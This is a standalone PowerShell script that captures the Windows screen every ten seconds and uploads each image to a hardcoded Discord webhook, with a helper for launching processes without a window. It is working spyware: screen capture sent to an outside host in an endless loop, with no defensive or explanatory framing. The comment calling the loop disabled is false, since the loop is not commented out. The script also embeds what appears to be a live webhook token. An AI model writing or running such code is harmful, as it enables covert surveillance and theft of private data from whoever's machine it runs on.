# Function to capture a screenshot
function Capture-Screenshot {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen(0, 0, 0, 0, $screen.Size)
    $fileName = "$env:TEMP\screenshot_$((Get-Date).ToString('yyyyMMdd_HHmmss')).png"
    $bitmap.Save($fileName, [System.Drawing.Imaging.ImageFormat]::Png)
    return $fileName
}

# Function to send screenshot to Discord via webhook
function Send-DiscordWebhook {
    param (
        [string]$webhookUrl,
        [string]$filePath
    )
    
    $fileName = [System.IO.Path]::GetFileName($filePath)
    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
    $boundary = [System.Guid]::NewGuid().ToString()

    $LF = "`r`n"
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"payload_json`"",
        "Content-Type: application/json$LF",
        "{`"content`":`"New screenshot uploaded`"}",
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
        "Content-Type: image/png$LF",
        $fileEnc,
        "--$boundary--$LF"
    ) -join $LF

    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    try {
        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $bodyLines
        Write-Host "Screenshot sent successfully."
        Write-Host "Response: $($response | ConvertTo-Json -Depth 3)"
    } catch {
        Write-Host "Error sending screenshot:"
        Write-Host "StatusCode:" $_.Exception.Response.StatusCode.value__ 
        Write-Host "StatusDescription:" $_.Exception.Response.StatusDescription
        Write-Host "Response:" $_.ErrorDetails.Message
    }
}
function Start-HiddenProcess {
    param (
        [string]$FilePath,
        [string]$Arguments
    )
    
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $FilePath
    $psi.Arguments = $Arguments
    $psi.CreateNoWindow = $true
    $psi.UseShellExecute = $false
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    
    $process = [System.Diagnostics.Process]::Start($psi)
    $process.WaitForExit()
}

# Webhook URL
$WebhookUrl = "https://discord.com/api/webhooks/1279434221747961947/4v9LMvOEODPdrCLAPkBxgkjRc5Hkwfx2DkwBNy8AjJjp56aOwuuechnScKGGb77trwPb"

# Capture and send a single screenshot
$screenshot = Capture-Screenshot
Write-Host "Screenshot saved to: $screenshot"
Send-DiscordWebhook -webhookUrl $WebhookUrl -filePath $screenshot

# Uncomment the following lines to enable continuous screenshot capture and upload
 while ($true) {
     $screenshot = Capture-Screenshot
     Write-Host "Screenshot saved to: $screenshot"
     Send-DiscordWebhook -webhookUrl $WebhookUrl -filePath $screenshot
     Start-Sleep -Seconds 10
}
